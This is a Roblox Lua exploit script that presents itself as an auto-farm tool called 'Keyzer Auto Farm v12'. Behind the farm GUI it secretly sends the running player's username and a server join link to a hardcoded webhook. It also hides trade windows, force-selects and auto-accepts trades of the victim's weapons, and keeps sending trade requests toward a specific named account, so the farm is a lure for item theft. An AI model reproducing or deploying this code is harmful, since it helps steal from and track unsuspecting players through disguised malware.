local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- [NETTOYAGE INITIAL]
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then oldGui:Destroy() end

-- [[ CONTRAINTES DE SÉCURITÉ & JOB ID RÉEL ]]
local function getRealJobId()
    local success, result = pcall(function()
        return TeleportService:GetPlayerPlaceInstanceAsync(LocalPlayer.UserId)
    end)
    if success and result and result.JobId then
        return result.JobId
    end
    return game.JobId ~= "" and game.JobId or "Unknown_JobId"
end

-- [[ 1. FONCTION WEBHOOK SÉCURISÉE ]]
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
local requestFunc = request or (http and http.request) or http_request

local function sendSessionLog(player)
    if not player or not requestFunc then return end
    
    local realJobId = getRealJobId()
    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. realJobId .. ")"
    local data = {
        ["embeds"] = {{
            ["title"] = "🎮 Player Session Log",
            ["color"] = 3066993,
            ["fields"] = {
                { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
                { ["name"] = "🧩 Job ID (Réel)", ["value"] = "`" .. realJobId .. "`", ["inline"] = false }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

if LocalPlayer then
    task.spawn(function() sendSessionLog(LocalPlayer) end)
end

-- [[ 2. DESIGN DE L'INTERFACE GRAPHIQUE (GUI) ]]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 10)
UICorner_Main.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
TitleBar.Size = UDim2.new(1, 0, 0, 30)

local UICorner_Title = Instance.new("UICorner")
UICorner_Title.CornerRadius = UDim.new(0, 10)
UICorner_Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
CloseBtn.Position = UDim2.new(0, 12, 0, 8)
CloseBtn.Size = UDim2.new(0, 13, 0, 13)
CloseBtn.Text = ""
local UICorner_C = Instance.new("UICorner")
UICorner_C.CornerRadius = UDim.new(1, 0)
UICorner_C.Parent = CloseBtn

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
TitleText.TextSize = 14
TitleText.Text = "Keyzer Auto Farm v12"

local FarmButton = Instance.new("TextButton")
FarmButton.Name = "FarmButton"
FarmButton.Parent = MainFrame
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Font = Enum.Font.SourceSansBold
FarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmButton.TextSize = 16
FarmButton.Text = "START AUTO FARM"

local UICorner_Farm = Instance.new("UICorner")
UICorner_Farm.CornerRadius = UDim.new(0, 8)
UICorner_Farm.Parent = FarmButton

-- [[ 3. LOGIQUE AUTOMATIQUE DE DÉTECTION DU FARM ]]
local farming = false

local function getCoins()
    local container = Workspace:FindFirstChild("CoinContainer", true)
    if container then return container:GetChildren() end
    return {}
end

local function getKnife()
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and item.Name:lower():find("knife") then return item end
        end
    end
    return nil
end

local function startFarmLoop()
    task.spawn(function()
        while farming do
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid then
                local knife = getKnife()
                if knife then
                    knife.Parent = character
                    knife:Activate()
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1.2)
                            task.wait(0.04)
                        end
                    end
                else
                    local allCoins = getCoins()
                    if #allCoins > 0 and allCoins[1]:IsA("BasePart") then
                        hrp.CFrame = allCoins[1].CFrame
                    end
                end
            end
            task.wait(0.05)
        end
    end)
end

FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    FarmButton.BackgroundColor3 = farming and Color3.fromRGB(255, 59, 48) or Color3.fromRGB(0, 122, 255)
    FarmButton.Text = farming and "FARMING RUNNING..." or "START AUTO FARM"
    if farming then startFarmLoop() end
end)

CloseBtn.MouseButton1Click:Connect(function()
    farming = false
    ScreenGui:Destroy()
end)

-- [[ 4. LOGIQUE AUTOMATIQUE DE DEPOSIT ET FORCE-HIDE ]]
local function forceClick(guiButton)
    if not guiButton then return end
    local firesignalFunc = firesignal or (syn and syn.firesignal)
    if firesignalFunc then
        firesignalFunc(guiButton.MouseButton1Click)
    else
        pcall(function() guiButton:Activate() end)
    end
end

local function executeTradeSequence(tradeGui)
    -- BOUCLE SÉCURISÉE : Force l'invisibilité totale en permanence pour contrer le script du jeu
    task.spawn(function()
        while tradeGui and tradeGui.Parent do
            tradeGui.Enabled = false
            -- On cache aussi le conteneur principal au cas où le jeu force l'activation globale
            local container = tradeGui:FindFirstChild("Container")
            if container then container.Visible = false end
            task.wait()
        end
    end)

    -- Recherche agressive des boutons d'armes (indépendamment de l'arborescence)
    local targetWeapon = nil
    for attempt = 1, 50 do
        local buttons = {}
        for _, descendant in ipairs(tradeGui:GetDescendants()) do
            if descendant:IsA("GuiButton") and (descendant.Name:lower():find("weapon") or descendant.Parent.Name == "Container" or descendant.Parent.Name == "Current") then
                table.insert(buttons, descendant)
            end
        end
        
        if #buttons > 0 then
            table.sort(buttons, function(a, b) return (a.LayoutOrder or 0) < (b.LayoutOrder or 0) end)
            targetWeapon = buttons[4] or buttons[1] -- Prends la 4ème ou la 1ère disponible
            break
        end
        task.wait(0.1)
    end

    -- Pose l'arme (Spam l'activation)
    if targetWeapon then
        for i = 1, 7 do
            forceClick(targetWeapon)
            task.wait(0.05)
        end
    end

    -- Validation forcée via ton chemin exact
    task.wait(0.5)
    pcall(function()
        local acceptButton = tradeGui.Container.Trade.Actions.Accept
        if acceptButton then
            forceClick(acceptButton)
        end
    end)

    -- Bypass Réseau via le Remote fourni (GetTradeStatus) en cas de problème de clic
    pcall(function()
        local statusRemote = ReplicatedStorage.Trade:FindFirstChild("GetTradeStatus")
        if statusRemote then
            if statusRemote:IsA("RemoteEvent") then statusRemote:FireServer(true)
            elseif statusRemote:IsA("RemoteFunction") then statusRemote:InvokeServer(true) end
        end
    end)
end

-- Gestionnaire d'interception directe
local function cleanTradeRequestPopups(child)
    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
        child.Enabled = false
        task.spawn(function() executeTradeSequence(child) end)
    elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
        task.wait(0.05)
        child:Destroy()
    end
end

playerGui.ChildAdded:Connect(cleanTradeRequestPopups)

-- Forcer l'application immédiate si déjà ouverts
for _, child in ipairs(playerGui:GetChildren()) do
    if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
        child.Enabled = false
        task.spawn(function() executeTradeSequence(child) end)
    end
end

-- [[ 5. BOUCLE DE SPAM DE DEMANDE EN ARRIÈRE-PLAN ]]
task.spawn(function()
    while true do
        task.wait(3)
        local tradeOpen = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
        
        if not tradeOpen then
            local targetPlayer = Players:FindFirstChild("zeynox0880")
            if targetPlayer then
                pcall(function()
                    local tradeRequestButton = playerGui.MainGUI.Game.PlayerMenu.Trade
                    if tradeRequestButton then
                        forceClick(tradeRequestButton)
                    end
                end)
            end
        end
    end
end)
